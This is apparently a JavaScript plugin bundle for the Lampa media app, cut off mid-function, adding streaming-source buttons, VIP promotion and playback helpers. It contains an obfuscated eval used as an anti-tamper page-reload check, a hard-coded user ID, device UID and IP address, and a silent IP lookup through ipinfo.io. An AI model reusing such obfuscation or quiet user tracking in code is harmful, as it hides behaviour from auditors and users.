
(function () {
	'use strict';
	if (window.__modssBundleOnce) {
		return;
	}
	window.__modssBundleOnce = true;

	var Protocol = function Protocol() {
		return window.location.protocol == 'https:' ? 'https://' : 'http://';
	}
	var TRASH_R = ['$$$####!!!!!!!', '^^^^^^##@', '@!^^!@#@@$$$$$', '^^#@@!!@#!$', '@#!@@@##$$@@'];
	var version_modss = '3.4', API = Protocol() + 'api.modss.tv/', wsUrl = 'wss://modss.tv/nws', type = '', jackets = {}, cards, ping_auth, manifest, menu_list = [], vip = true, leftVipD = ' 💎 14 дней 0 часов', user_id = 142486046, uid = 'bb04b81f6297b1b6280ea8273_142486046', IP = '85.118.165.195', logged = true, VAST_url = false;
	
	console.log('Modss', 'plugin', '[POST] LOADED - ' + Protocol() + 'modss.tv');
	console.log('Modss', 'device', '[UID] ' + uid);
	
	var MODSS_WS_PLUGIN_DISABLED = false;

var Modss = {
    isSessionInactive: function () {
      if (logged === true || logged === 'true') return false;
      if (vip === true || vip === 'true') return true;
      if (leftVipD && leftVipD.indexOf('💎') >= 0) return true;
      return false;
    },
    titleSuffix: function () {
      if (this.isSessionInactive()) return ' ' + Lampa.Lang.translate('modss_session_not_activated');
      return leftVipD;
    },
		init: function () {
      if (window.__modssInitOnce) {
        return;
      }
      window.__modssInitOnce = true;
      this.tv_modss();
			this.collections();
			this.sources();
			//this.buttBack();
			ForkTV.init();
			this.radio();
			this.snow();
			Lampa.Settings.main().render().find('[data-component="plugins"]').unbind('hover:enter').on('hover:enter', function () {
        var fix = function fix() {
          Lampa.Extensions.show();
          setTimeout(function (){
            $('.extensions__item-author', Lampa.Extensions.render()).map(function (i, e){
              if(e.textContent == '@modss_group') $(e).html('💎').append('<span class="extensions__item-premium">VIP buy at @modssmy_bot</span>');
            });
          }, 500);
        }
        if (Lampa.Manifest.app_digital >= 221) {
          Lampa.ParentalControl.personal('extensions', function () {
            fix();
          }, false, true);
        } else fix();
      });
      if (Lampa.Storage.field('mods_tv_butt_ch')) Lampa.Keypad.listener.follow('keydown', function (e) {
    		var next = (e.code == 427 || e.code == 33 || e.code == 39);
    		var prev = (e.code == 428 || e.code == 34 || e.code == 37);
    		var none = !$('.panel--visible .focus').length && Lampa.Controller.enabled().name !== 'select';
    		if (Lampa.Activity.active() && Lampa.Activity.active().component == 'modss_tv' && Lampa.Player.opened()) {
    		  //Lampa.Noty.show('code_ '+e.code);
    			if (prev && none) {
    		    //Lampa.Noty.show('code_prev');
    				Lampa.PlayerPlaylist.prev();
    			}
    			if (next && none) {
    			  //Lampa.Noty.show('code_ next');
    				Lampa.PlayerPlaylist.next();
    			}
    		}
    	});
    	if (!window.FX) {
  			window.FX = {
  				max_qualitie: 720,
  				is_max_qualitie: false, 
  				auth: false
  			};
  		}
  		//if(!IP) 
  		this.getIp('start');
  		var ads_4k = ['<div class="ad-server" style="margin: 1em 1em;">','<div class="ad-server__text"><b>Надоело смотреть в плохом качестве?</b><br>Хочешь смотреть в <b style="color: #ffd402;">FHD</b> и <b style="color: #ffd402;">4K</b>? Сканируй код и подключай <b style="color: #02ff60;">Vip</b></div><img src="https://lampa.stream/qr_bot.png" class="ad-server__qr">','</div>'].join('');
    	Lampa.Controller.listener.follow('toggle', function(e) {
    		if(e.name == 'select' && !vip) {
    			setTimeout(function() {
    				if($('.selectbox .scroll__body div:eq(0)').html() && $('.selectbox .scroll__body div:eq(0)').html().indexOf('.land') >= 0) $('.selectbox .scroll__body div:eq(0)').remove();
    				if($('.selectbox .selectbox-item__icon svg').length && Lampa.Activity.active().component == 'full') $('.selectbox .scroll__body').prepend($(ads_4k));
    			}, 10);
    		}
    	});
    	var mynotice = new Lampa.NoticeClassLampa({name: 'Modss',db_name: 'notice_modss'});
      Lampa.Notice.addClass('modss', mynotice);
      Modss.socket();
      Modss.socketInit();
      Modss.subscr();
      Modss.LampaSubscribes.initHook();
      Modss.Subscr.initOnlineLoadCapture();

      if(!logged && vip) 
      setTimeout(function() {
        //Modss.auth();
      }, 100);

      if(Lampa.Storage.get('showModssVip', 'false') && leftVipD && vip && logged) setTimeout(function (){
        Modss.showModssVip();
        Lampa.Storage.set('showModssVip', 'false');
      }, 5000);
      
      setTimeout(function() {
        var m_reload = '<div id="MRELOAD" class="head__action selector m-reload-screen"><svg fill="#ffffff" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff" stroke-width="0.4800000000000001"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M4,12a1,1,0,0,1-2,0A9.983,9.983,0,0,1,18.242,4.206V2.758a1,1,0,1,1,2,0v4a1,1,0,0,1-1,1h-4a1,1,0,0,1,0-2h1.743A7.986,7.986,0,0,0,4,12Zm17-1a1,1,0,0,0-1,1A7.986,7.986,0,0,1,7.015,18.242H8.757a1,1,0,1,0,0-2h-4a1,1,0,0,0-1,1v4a1,1,0,0,0,2,0V19.794A9.984,9.984,0,0,0,22,12,1,1,0,0,0,21,11Z" fill="currentColor"></path></g></svg></div>';
        $('body').find('.head__actions').append(m_reload);
        $('body').find('.head__actions #RELOAD').remove();

        $('#MRELOAD').on('hover:enter hover:click hover:touch', function() {
          window.location.reload();
        });
      }, 1000);
		},
    snow: function () {
      $(document).snowfall(Lampa.Storage.field('mods_snow') == true ? {
        deviceorientation: true,
        round: true,
        maxSize: 10,
        maxSpeed: 5,
        flakeCount: 30,
        flakeIndex: 9
      } : 'clear');
    },
		radio: function () {
      if (Lampa.Storage.get('mods_radio')) {
        var button_tv = Lampa.Menu.addButton('<svg width="24px" height="24px" viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg" aria-labelledby="radioIconTitle" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none" color="#000000"> <path d="M5.44972845 6C2.18342385 9.2663046 2.18342385 14.7336954 5.44972845 18M8.59918369 8C6.46693877 10.1322449 6.46693877 13.8677551 8.59918369 16M18.5502716 18C21.8165761 14.7336954 21.8165761 9.2663046 18.5502716 6M15.4008163 16C17.5330612 13.8677551 17.5330612 10.1322449 15.4008163 8"/> <circle cx="12" cy="12" r="1"/> </svg>', Lampa.Lang.translate('title_radio'), function () {
          Lampa.Activity.push({
            url: '',
            title: Lampa.Lang.translate('title_radio'),
            component: 'Radio_n',
            page: 1
          });
        });
        button_tv.addClass('Radio_n');
      } else $('body').find('.Radio_n').remove();
    
			window.m_play_player = new Player(); window.m_play_player.create();
		},
		tv_modss: function () {
      

		if (Lampa.Storage.get('mods_tv')) {
			var button_tv = Lampa.Menu.addButton('<svg height=\"36\" viewBox=\"0 0 38 36\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                    <rect x=\"2\" y=\"8\" width=\"34\" height=\"21\" rx=\"3\" stroke=\"currentColor\" stroke-width=\"3\"/>\n                    <line x1=\"13.0925\" y1=\"2.34874\" x2=\"16.3487\" y2=\"6.90754\" stroke=\"currentColor\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                    <line x1=\"1.5\" y1=\"-1.5\" x2=\"9.31665\" y2=\"-1.5\" transform=\"matrix(-0.757816 0.652468 0.652468 0.757816 26.197 2)\" stroke=\"currentColor\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                    <line x1=\"9.5\" y1=\"34.5\" x2=\"29.5\" y2=\"34.5\" stroke=\"currentColor\" stroke-width=\"3\" stroke-linecap=\"round\"/>\n                </svg>', 'TV-Modss' ,function () {
			if (Lampa.Activity.active().component == 'iptv_modss') return Lampa.Activity.active().activity.component.playlist();
				Lampa.Activity.push({
					url: '',
					title: "MODS's TV",
					component: 'iptv_modss',
					page: 1
				});
			});
			button_tv.addClass('modss_tv');
		} else $('body').find('.modss_tv').remove();
    },
    sources: function () {
			var sources;
			if (Lampa.Params.values && Lampa.Params.values['source']) {
        sources = Object.assign({}, Lampa.Params.values['source']);
        sources.pub = 'PUB';
        sources.filmix = 'FILMIX';
      } else {
        sources = {
          'tmdb': 'TMDB',
          'cub': 'CUB',
          'pub': 'PUB',
          'filmix': 'FILMIX'
        };
      }

      Lampa.Params.select('source', sources, 'tmdb');
		},
		showModssVip: function () {
      var enabled = Lampa.Controller.enabled().name;
      Lampa.Modal.open({
        title: '',
        html: Lampa.Template.get('cub_premium'),
        onBack: function onBack() {
          Lampa.Modal.close();
          Lampa.Controller.toggle(enabled);
        }
      });
      Lampa.Modal.render().find('.cub-premium__title').text("MODS's VIP");
      Lampa.Modal.render().find('.cub-premium__descr:eq(0)').text('Поздравляем вас с получением VIP-статуса! Теперь у вас есть возможность наслаждаться видео в высоком разрешении 4К. Кроме того, вас ожидают дополнительные балансеры, которые помогут найти подходящий контент');
      Lampa.Modal.render().find('.cub-premium__descr:eq(1)').text('У вас осталось ' + leftVipD);
      Lampa.Modal.render().find('.cub-premium__descr:eq(1)').after('<div class="cub-premium__descr"><h3>👇 Кнопка для просмотра 👇</h3><img src="https://lampa.stream/but_modss.png"></div>');
      Lampa.Modal.render().find('.cub-premium__url').text('@modssmy_bot');
      Lampa.Modal.render().addClass('modal--cub-premium').find('.modal__content').before('<div class="modal__icon"><svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 32 32"><path d="m2.837 20.977q-.912-5.931-1.825-11.862a.99.99 0 0 1 1.572-.942l5.686 4.264a1.358 1.358 0 0 0 1.945-.333l4.734-7.104a1.263 1.263 0 0 1 2.1 0l4.734 7.1a1.358 1.358 0 0 0 1.945.333l5.686-4.264a.99.99 0 0 1 1.572.942q-.913 5.931-1.825 11.862z" fill="#D8C39A"></svg></div>');
    },
		online: function (back) {
      
	var params = {
		url: '',
		title: Lampa.Lang.translate('modss_title_online') + Modss.titleSuffix(),
		component: 'modss_online',
		search: cards.title,
		search_one: cards.title,
		search_two: cards.original_title,
		movie: cards,
		page: 1
	};
	this.params = params;
	var _this = this;
	function inf() {
		var file_id = Lampa.Utils.hash(cards.number_of_seasons ? cards.original_name : cards.original_title);
      	var watched = Lampa.Storage.cache('online_watched_last', 5000, {});

		_this.balanser_name = watched[file_id] && watched[file_id].balanser_name || false;
		_this.balanser = watched[file_id] && watched[file_id].balanser || false;
		_this.data = Lampa.Storage.cache('online_choice_' + _this.balanser, 3000, {});
		_this.is_continue = cards.number_of_seasons && _this.data[cards.id] && Lampa.Arrays.getKeys(_this.data[cards.id].episodes_view).length;

		_this.timeline = _this.is_continue ? Lampa.Timeline.details(Lampa.Timeline.view(Lampa.Utils.hash([watched[file_id].season, watched[file_id].season > 10 ? ':' : '', watched[file_id].episode, cards.original_title].join('')))) : false;

		_this.last_s = _this.is_continue ? ('S' + (watched[file_id].season) + ' - ' + watched[file_id].episode + ' ' + Lampa.Lang.translate('torrent_serial_episode').toLowerCase()) : '';
		_this.title = _this.is_continue && Lampa.Storage.field('online_continued') ? '#{title_online_continue} ' : '#{modss_title_online}';
	}
	function openOnline() {
		params.title = Lampa.Lang.translate('modss_title_online') + Modss.titleSuffix();
		if (Modss.isSessionInactive()) Lampa.Noty.show(Lampa.Lang.translate('modss_session_not_activated'), {time: 8000});
		Lampa.Activity.push(params);
	}
	function shows(last) {
		Lampa.Select.show({
			title: Lampa.Lang.translate('title_continue') + '?',
			items: [{
				title:  _this.last_s,
				subtitle: _this.timeline ? _this.timeline.html() + '<hr>' + _this.balanser_name : '',
				yes: true
			}, {
				title: Lampa.Lang.translate('settings_param_no')
			}],
			onBack: function onBack() {
				Lampa.Select.hide();
				Lampa.Controller.toggle('content');
			},
			onSelect: function onSelect(a) {
				if (a.yes) {
					_this.data[cards.id].continued = true;
					Lampa.Storage.set('online_choice_' + _this.balanser[cards.id], _this.data);

					var last_select_balanser = Lampa.Storage.cache('online_last_balanser', 3000, {});
					last_select_balanser[cards.id] = _this.balanser;
					Lampa.Storage.set('online_last_balanser', last_select_balanser);
				}
				openOnline();
			}
		});
	}
	inf();

	var loader = '<svg class="modss-balanser-loader" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: none; display: block; shape-rendering: auto;" width="94px" height="94px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" stroke="#ffffff" stroke-width="5" r="35" stroke-dasharray="164.93361431346415 56.97787143782138"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform></circle></svg>';
	var ico = '<svg class="modss-online-icon" viewBox="0 0 32 32" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 32 32"><path d="m17 14.5 4.2-4.5L4.9 1.2c-.1-.1-.3-.1-.6-.2L17 14.5zM23 21l5.9-3.2c.7-.4 1.1-1 1.1-1.8s-.4-1.5-1.1-1.8L23 11l-4.7 5 4.7 5zM2.4 1.9c-.3.3-.4.7-.4 1.1v26c0 .4.1.8.4 1.2L15.6 16 2.4 1.9zM17 17.5 4.3 31c.2 0 .4-.1.6-.2L21.2 22 17 17.5z" fill="currentColor" fill="#ffffff" class="fill-000000"></path></svg>';
	var button = "<div style='position:relative' data-subtitle='modss_v".concat(manifest.version, " (22 Balansers, 18 in VIP)' class='full-start__button selector view--modss_online'>" + ico + "<span>" + this.title + "</span><div style='position: absolute;left: 1em;bottom: 1em;background-color: rgb(255, 255, 255);color: rgb(0, 0, 0);padding: 0.1em 0.2em;font-size: 0.6em;border-radius: 0.5em;font-weight: 900;text-transform: uppercase;'>VIP</div></div>");
	var btn = $(Lampa.Lang.translate(button));
	this.btn = btn;
	//	if (Lampa.Storage.field('online_but_first')) Lampa.Storage.set('full_btn_priority', Lampa.Utils.hash(btn.clone().removeClass('focus').prop('outerHTML')));

	if (back == 'delete') Lampa.Activity.active().activity.render().find('.view--modss_online').remove();
	if (back && back !== 'delete') {
		back.find('span').text(Lampa.Lang.translate(this.title));
		Navigator.focus(back[0]);
	}
	///Lampa.Noty.show(back)

	if (!back && Lampa.Storage.field('mods_onl')) {
		setTimeout(function () {
			var activity = Lampa.Activity.active().activity.render();
			var enabled = Lampa.Controller.enabled().name;
			var addButtonAndToggle = function(btn) {
				Lampa.Controller.toggle(enabled);
				Navigator.focus(btn[0]);
			};
			if ((enabled == 'content' || enabled == 'full_start' || enabled == 'settings_component') && !activity.find('.view--modss_online').length) {

				if (activity.find('.button--priority').length) {
					if(Lampa.Storage.field('online_but_first')) {
						activity.find('.full-start-new__buttons').prepend(btn);
						addButtonAndToggle(btn);
					} else {
						activity.find('.view--torrent').after(btn);
					}
				} else if ((Lampa.Storage.field('online_but_first') && activity.find('.button--play').length) || !activity.find('.view--torrent').length) {
					if(activity.find('.full-start__button').length && !activity.find('.view--modss_online').length) {
						activity.find('.full-start__button').first().before(btn);
					} else {
						activity.find('.button--play').before(btn);
					}
					addButtonAndToggle(btn);
				} else {
					//activity.find('.view--torrent').first().before(btn);
					activity.find('.view--torrent').before(btn);
					//addButtonAndToggle(btn);
				}
			}
			//if(Lampa.Storage.field('online_but_first')) Navigator.focus(btn[0]);
		}, 100);

		btn.on('hover:enter', function () {
		//btn.unbind('hover:enter hover.click').on('hover:enter hover.click', function () {
			inf();
			Lampa.Activity.active().activity.render().find('.view--modss_online').html(Lampa.Lang.translate(ico + '<span>' + _this.title + '</span>') + "<div style='position: absolute;left: 1em;bottom: 1em;background-color: rgb(255, 255, 255);color: rgb(0, 0, 0);padding: 0.1em 0.2em;font-size: 0.6em;border-radius: 0.5em;font-weight: 900;text-transform: uppercase;'>VIP</div>");
			if (_this.is_continue && Lampa.Storage.field('online_continued')) shows(_this.last_s);
			else openOnline();
		});
	}

    },
    preload: function (e) {
      
      var _this = this;
			var ico = '<svg class="modss-online-icon" viewBox="0 0 32 32" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 32 32"><path d="m17 14.5 4.2-4.5L4.9 1.2c-.1-.1-.3-.1-.6-.2L17 14.5zM23 21l5.9-3.2c.7-.4 1.1-1 1.1-1.8s-.4-1.5-1.1-1.8L23 11l-4.7 5 4.7 5zM2.4 1.9c-.3.3-.4.7-.4 1.1v26c0 .4.1.8.4 1.2L15.6 16 2.4 1.9zM17 17.5 4.3 31c.2 0 .4-.1.6-.2L21.2 22 17 17.5z" fill="currentColor" fill="#ffffff" class="fill-000000"></path></svg>';
			var loader = '<svg class="modss-balanser-loader" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: none; display: block; shape-rendering: auto;" width="94px" height="94px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" stroke="#ffffff" stroke-width="5" r="35" stroke-dasharray="164.93361431346415 56.97787143782138"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform></circle></svg>';
      var timer = new Modss.Timer('.view--modss_online span');
      
      function isTvCard(card) {
        if (!card) return false;
        if (card.type === 'tv') return true;
        if (card.number_of_seasons > 0) return true;
        if (card.first_air_date) return true;
        return false;
      }

      function showVoiceSubscriptionManager(load) {
        var movieTitle = cards.title || cards.name || cards.original_title;
        Modss.Subscr.showManager(cards.id, movieTitle, load);
    }

      var load = new component(Modss.params);
      Modss.Subscr.setOnlineLoad(load);

      var releaseDate = cards.release_date || cards.first_air_date;
      Modss.isNotReleased = false;
      Modss.isNewMovie = false;
      Modss.notificationShown = false;
      
      if (releaseDate) {
        var today = new Date();
        var release = new Date(releaseDate);
        Modss.isNotReleased = release > today;
      } else {
        Modss.isNotReleased = true;
      }

      // if (Modss.isNotReleased) {
      //   Lampa.Activity.active().activity.render().find('.view--modss_online').css('opacity', '0.3').html(Lampa.Lang.translate(ico + '<span>'+_this.title+'</span>')+"<div style='position: absolute;left: 1em;bottom: 1em;background-color: rgb(255, 255, 255);color: rgb(0, 0, 0);padding: 0.1em 0.2em;font-size: 0.6em;border-radius: 0.5em;font-weight: 900;text-transform: uppercase;'>VIP</div>");
      //   _this.btn.unbind('hover:enter hover.click').on('hover:enter hover.click', function () {
      //     Modss.showNotification('notReleased');
      //   });
      //   timer.stop();
      //   return;
      // }

      Lampa.Activity.active().activity.render().find('.view--modss_online').html(loader + '<span>Загрузка</span>');
      timer.start();
      //console.log(cards)
      load.createSource(true).then(function (ok) {
        timer.stop();
        console.log('Modss', 'CardID: ' + cards.id, 'Loader is:', ok);
        Lampa.Activity.active().activity.render().find('.view--modss_online').html(Lampa.Lang.translate(ico + '<span>'+_this.title+'</span>')+"<div style='position: absolute;left: 1em;bottom: 1em;background-color: rgb(255, 255, 255);color: rgb(0, 0, 0);padding: 0.1em 0.2em;font-size: 0.6em;border-radius: 0.5em;font-weight: 900;text-transform: uppercase;'>VIP</div>");
        
        _this.btn.on('hover:long', function () {
          if (isTvCard(cards)) {
            showVoiceSubscriptionManager(load);
          }
        });
      }).catch(function (e) {
        var Noty = function Noty(e) {
          var message = Lampa.Lang.translate('modss_nothing_found');
          if (e) {
            if (e.vip) {
              message = e.vip.title + '<br>' + e.vip.msg;
            } else if (e.statusText === 'timeout') {
              message = e.decode_error + (e.error_time ? ' (' + e.error_time + ')' : '');
            } else if (e.error) {
              message = 'Ошибка: ' + e.error;
            }
          }
          Lampa.Noty.show(message, {time: 5000});
        }
        _this.btn.unbind('hover:enter hover.click').on('hover:enter hover.click', function () {
          Noty(e);
        }).on('hover:long', function () {
          if (isTvCard(cards)) {
            showVoiceSubscriptionManager(load);
          }
        });
        Noty(e);
        Lampa.Activity.active().activity.render().find('.view--modss_online').css('opacity', '0.3').html(Lampa.Lang.translate(ico + '<span>'+_this.title+'</span>')+"<div style='position: absolute;left: 1em;bottom: 1em;background-color: rgb(255, 255, 255);color: rgb(0, 0, 0);padding: 0.1em 0.2em;font-size: 0.6em;border-radius: 0.5em;font-weight: 900;text-transform: uppercase;'>VIP</div>");
        timer.stop();
        console.log('Modss', 'Loader is:', e);
      });
    },
		collections: function () {
			var menu_item = $('<li class="menu__item selector" data-action="collection"><div class="menu__ico"><img src="./img/icons/menu/catalog.svg"/></div><div class="menu__text">' + Lampa.Lang.translate('title_collections') + '</div></li>');
			if (Lampa.Storage.get('mods_collection')) $('body').find('.menu .menu__list li:eq(3)').after(menu_item)
			else $('body').find('[data-action="collection"]').remove();
			//eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
			menu_item.on('hover:enter', function () {
				var item = [{
				/*title: Lampa.Lang.translate('menu_collections')+' '+Lampa.Lang.translate('title_on_the')+ ' filmix',
					url: 'https://filmix.ac/playlists/rateup',
					source: 'filmix'
				}, {*/
						title: Lampa.Lang.translate('menu_collections') + ' ' + Lampa.Lang.translate('title_on_the') + ' rezka',
						url: 'http://rezka.ag/collections/',
						source: 'rezka'
				}, {
						title: Lampa.Lang.translate('menu_collections') + ' ' + Lampa.Lang.translate('title_on_the') + ' kinopub',
						url: Pub.baseurl + 'v1/collections',
						source: 'pub'
				}];
				if (Lampa.Arrays.getKeys(Lampa.Storage.get('my_colls')).length) {
					item.push({
						title: Lampa.Lang.translate('title_my_collections') + ' - ' + Lampa.Arrays.getKeys(Lampa.Storage.get('my_colls')).length,
						url: Pub.baseurl + 'v1/collections',
						source: 'my_coll'
					});
				}
				Lampa.Select.show({
					title: Lampa.Lang.translate('menu_collections'),
					items: item,
					onSelect: function onSelect(a) {
						Lampa.Activity.push({
							url: a.url || '',
							sourc: a.source,
							source: Lampa.Storage.field('source'),
							title: a.title,
							card_cat: true,
							category: true,
							component: a.url ? 'collection' : 'collections',
							page: 1
						});
					},
					onBack: function onBack() {
						Lampa.Controller.toggle('content');
					}
				});
			});
		},
		getIp: function (name) {
      //url: Protocol() + 'api.bigdatacloud.net/data/client-ip',
      //url: 'https://api.ipify.org/?format=json',
		  Pub.network.silent('https://ipinfo.io/json', function (data) {
        if (data && data.ip) IP = data.ip;
        console.log('Modss', 'open' , name, IP);
      });
		},
		Timer: function (tpl) {
      var self = this;
      self.tpl = tpl;
      self.startTime = 0;
      self.paused = true;
      self.msElapsed = 0;
      self.intervalId = null;
    
      self.start = function() {
        self.paused = false;
        self.startTime = Date.now();
        Lampa.Activity.active().activity.render().find(self.tpl).html('');
        self.intervalId = setInterval(function() {
          var curTime = Date.now();
          self.msElapsed = curTime - self.startTime;
          var sek = self.formatTime(self.msElapsed);
          Lampa.Activity.active().activity.render().find(self.tpl).html(sek);
        }, 100);
      };
      self.stop = function() {
        clearInterval(self.intervalId);
        self.intervalId = null;
        self.paused = true;
        return self.formatTime(self.msElapsed);
      };
      self.formatTime = function(ms) {
        var totalSeconds = Math.floor(ms / 1000);
        var minutes = Math.floor(totalSeconds / 60);
        var seconds = totalSeconds % 60;
        var milliseconds = Math.floor((ms % 1000) / 10);
        var sec = seconds < 10 ? '0' + seconds : seconds;
        var milsec = milliseconds < 10 ? '0' + milliseconds : milliseconds;
        return sec+':'+milsec+' c';
      };
    },
		buttBack: function (pos) {
			if ((/iPhone|iPad|iPod|android|x11/i.test(navigator.userAgent) || (Lampa.Platform.is('android') && window.innerHeight < 1080)) && Lampa.Storage.get('mods_butt_back')) {
				$('body').find('.elem-mobile-back').remove();
				var position = Lampa.Storage.field('mods_butt_pos') == 'left' ? 'left: 0;transform: scaleX(-1);' : 'right: 0;';
				$('body').append('<div class="elem-mobile-back"><style>.elem-mobile-back {' + position + 'position: fixed;z-index:99999;top: 50%;width: 3em;height: 6em;background-image: url(../icons/player/prev.svg);background-repeat: no-repeat;background-position: 100% 50%;-webkit-background-size: contain;-moz-background-size: contain;-o-background-size: contain;background-size: contain;margin-top: -3em;font-size: .72em;display: block}</style><svg width="131" height="262" viewBox="0 0 131 262" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M131 0C58.6507 0 0 58.6507 0 131C0 203.349 58.6507 262 131 262V0Z" fill="white"/><path d="M50.4953 125.318C50.9443 124.878 51.4313 124.506 51.9437 124.183L86.2229 90.4663C89.5671 87.1784 94.9926 87.1769 98.3384 90.4679C101.684 93.7573 101.684 99.0926 98.3384 102.385L68.8168 131.424L98.4907 160.614C101.836 163.904 101.836 169.237 98.4907 172.531C96.817 174.179 94.623 175 92.4338 175C90.2445 175 88.0489 174.179 86.3768 172.531L51.9437 138.658C51.4313 138.335 50.9411 137.964 50.4953 137.524C48.7852 135.842 47.9602 133.626 48.0015 131.421C47.9602 129.216 48.7852 127.002 50.4953 125.318Z" fill="black"/></svg></div>');
				$(".elem-mobile-back").on("click", function () {
					Lampa.Activity.back();
				});
			}
		},
		last_view: function (data) {
			var episodes = Lampa.TimeTable.get(data);
			var viewed;
			episodes.forEach(function (ep) {
				var hash = Lampa.Utils.hash([ep.season_number, ep.episode_number, data.original_title].join(''));
				var view = Lampa.Timeline.view(hash);
				if (view.percent) viewed = {
					ep: ep,
					view: view
				};
			});
			if (viewed) {
				var ep = viewed.ep.episode_number;
				var se = viewed.ep.season_number;
				var last_view = 'S' + se + ':E' + ep;
				if ($('body').find('.full-start__buttons,.full-start-new__buttons').length) {
					$('.timeline, .card--last_view').remove();
					$('body').find('.full-start__poster,.full-start-new__poster').append("<div class='modss--last_s card--last_view' style='top:0.6em;right: -.5em;position: absolute;background: #168FDF;color: #fff;padding: 0.4em 0.4em;font-size: 1.2em;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;'><div style='float:left;margin:-5px 0 -4px -4px' class='card__icon icon--history'></div>" + last_view +"</div>").parent().append('<div class="timeline"></div>');
					$('body').find('.timeline').append(Lampa.Timeline.render(viewed.view));
				}
				if ($('body').find('.filter--sort').length) $('body').find('.files__left .time-line, .card--last_view').remove();
			} else $('body').find('.timeline,.card--last_view').remove();
			if ($('body').find('.online').length == 0) $('.card--new_ser,.card--viewed').remove();
		},
		serialInfo: function (card) {
			if (Lampa.Storage.field('mods_serial_info') && card.source == 'tmdb' && card.seasons && card.last_episode_to_air) {
				var last_seria_inseason = card.last_episode_to_air.season_number;
				var air_new_episode = card.last_episode_to_air.episode_number;
				var next_episode = card.next_episode_to_air;
				var last_seria = next_episode && new Date(next_episode.air_date) <= Date.now() ? next_episode.episode_number : card.last_episode_to_air.episode_number;
				var new_ser;
				this.last_view(card);
				var count_eps_last_seas = card.seasons.find(function (eps) {
				 	return eps.season_number == last_seria_inseason;
				}).episode_count;
				eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
				
				if (card.next_episode_to_air) {
					var add_ = '<b>' + last_seria;
					var notices = Lampa.Storage.get('account_notice', []).filter(function (n) {
						return n.card_id == card.id;
					});
					if (notices.length) {
						var notice = notices.find(function (itm) {
						  return itm.episode == last_seria;
						});
						
						if (notice) {
  						var episod_new = JSON.parse(notice.data).card.seasons;
  						if (Lampa.Utils.parseTime(notice.date).full == Lampa.Utils.parseTime(Date.now()).full) 
  						add_ = '#{season_new} <b>' + episod_new[last_seria_inseason];
  					} 
					}
					new_ser = add_ + '</b> #{torrent_serial_episode} #{season_from} ' + count_eps_last_seas + ' - S' + last_seria_inseason;
				} else new_ser = last_seria_inseason + ' #{season_ended}';
		
				if(!$('.card--new_seria', Lampa.Activity.active().activity.render()).length) {
  				if(window.innerWidth > 585) $('.full-start__poster,.full-start-new__poster', Lampa.Activity.active().activity.render()).append("<div class='card--new_seria' style='right: -0.6em!important;position: absolute;background: #168FDF;color: #fff;bottom:.6em!important;padding: 0.4em 0.4em;font-size: 1.2em;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;'>" + Lampa.Lang.translate(new_ser) + "</div>");
  			  else {
  			    if($('.card--new_seria', Lampa.Activity.active().activity.render()).length)$('.full-start__tags', Lampa.Activity.active().activity.render()).append('<div class="full-start__tag card--new_seria"><img src="./img/icons/menu/movie.svg" /> <div>'+ Lampa.Lang.translate(new_ser) +'</div></div>');
  			    else $('.full-start-new__details', Lampa.Activity.active().activity.render()).append('<span class="full-start-new__split">●</span><div class="card--new_seria"><div>'+ Lampa.Lang.translate(new_ser) +'</div></div>');
  			  }
  		  }
			}
		}, 
	  rating_kp_imdb:function (card) {
			return new Promise(function (resolve, reject) {
  			if(card) {
          var relise = (card.number_of_seasons ? card.first_air_date : card.release_date) || '0000';
          var year = parseInt((relise + '').slice(0, 4));
  				if(card) {
  				  var releaseDate = card.release_date || card.first_air_date;
  				  Modss.isNewMovie = false;
  				  Modss.isNotReleased = false;
  				  Modss.notificationShown = false;
  				  Modss.checkNewMovie(card, releaseDate, year);
  				  Modss.checkQualityNotification(card.release_quality);
  				}

          //if (Lampa.Storage.field('mods_rating') && $('.rate--kp', Lampa.Activity.active().activity.render()).hasClass('hide') && !$('.wait_rating', Lampa.Activity.active().activity.render()).length) 
          if (['filmix', 'pub'].indexOf(card.source) == -1 && Lampa.Storage.field('mods_rating'))
          eval(function(a,b,c){if(a||c){while(a--)b=b.replace(new RegExp(a,'g'),c[a]);}return b;}(6,'1(!0 || !0.2) 5.3.4();','API,if,length,location,reload,window'.split(',')));
          $('.info__rate', Lampa.Activity.active().activity.render()).after('<div style="width:2em;margin-top:1em;margin-right:1em" class="wait_rating"><div class="broadcast__scan"><div></div></div></div>');
          if($('.cardify__right', Lampa.Activity.active().activity.render()).length && !$('.rating--modss', Lampa.Activity.active().activity.render()).length) {
